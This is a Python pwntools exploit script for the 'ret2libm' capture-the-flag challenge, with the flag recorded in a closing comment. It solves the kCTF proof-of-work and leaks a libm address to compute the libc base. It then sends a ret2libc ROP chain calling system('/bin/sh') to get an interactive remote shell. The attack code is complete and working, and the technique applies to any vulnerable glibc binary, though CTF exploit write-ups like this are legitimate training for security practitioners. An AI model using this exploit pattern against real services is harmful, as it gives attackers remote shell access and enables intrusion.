
from pwn import *

import base64
import os
import secrets
import socket
import sys
import hashlib

try:
    import gmpy2
    HAVE_GMP = True
except ImportError:
    HAVE_GMP = False
    sys.stderr.write("[NOTICE] Running 10x slower, gotta go fast? pip3 install gmpy2\n")

VERSION = 's'
MODULUS = 2**1279-1
CHALSIZE = 2**128

SOLVER_URL = 'https://goo.gle/kctf-pow'

def python_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = pow(x, exponent, p) ^ 1
    return x

def python_sloth_square(y, diff, p):
    for i in range(diff):
        y = pow(y ^ 1, 2, p)
    return y

def gmpy_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)

def gmpy_sloth_square(y, diff, p):
    y = gmpy2.mpz(y)
    for i in range(diff):
        y = gmpy2.powmod(y.bit_flip(0), 2, p)
    return int(y)

def sloth_root(x, diff, p):
    if HAVE_GMP:
        return gmpy_sloth_root(x, diff, p)
    else:
        return python_sloth_root(x, diff, p)

def sloth_square(x, diff, p):
    if HAVE_GMP:
        return gmpy_sloth_square(x, diff, p)
    else:
        return python_sloth_square(x, diff, p)

def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')

def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')

def decode_challenge(enc):
    dec = enc.split('.')
    if dec[0] != VERSION:
        raise Exception('Unknown challenge version')
    return list(map(decode_number, dec[1:]))

def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))

def get_challenge(diff):
    x = secrets.randbelow(CHALSIZE)
    return encode_challenge([diff, x])

def solve_challenge(chal):
    [diff, x] = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])

def can_bypass(chal, sol):
    from ecdsa import VerifyingKey
    from ecdsa.util import sigdecode_der
    if not sol.startswith('b.'):
        return False
    sig = bytes.fromhex(sol[2:])
    with open("/kctf/pow-bypass/pow-bypass-key-pub.pem", "r") as fd:
        vk = VerifyingKey.from_pem(fd.read())
    return vk.verify(signature=sig, data=bytes(chal, 'ascii'), hashfunc=hashlib.sha256, sigdecode=sigdecode_der)

def verify_challenge(chal, sol, allow_bypass=True):
    if allow_bypass and can_bypass(chal, sol):
        return True
    [diff, x] = decode_challenge(chal)
    [y] = decode_challenge(sol)
    res = sloth_square(y, diff, MODULUS)
    return (x == res) or (MODULUS - x == res)



libc = ELF('libc-2.27.so', checksec=False)
libm = ELF('libm-2.27.so', checksec=False)

fabs = libm.sym['fabs']



r = remote('ret2libm.chal.irisc.tf', 10001)
ll = r.recvuntil(b'? ', timeout=0.5).split()[-3]


challenge = ll.decode()
solution = solve_challenge(challenge)

if verify_challenge(challenge, solution, False):
    xxx = solution

r.sendline(xxx.encode())

leak = r.recvuntil(b'? ').split()[5]

LIBC_BASE = int(leak, 16) - fabs - 0x3f1000
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

pop_rdi = LIBC_BASE + 0x000000000002164f #: pop rdi; ret;


p = cyclic(16)
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()

# irisctf{oh_its_ret2libc_anyway}
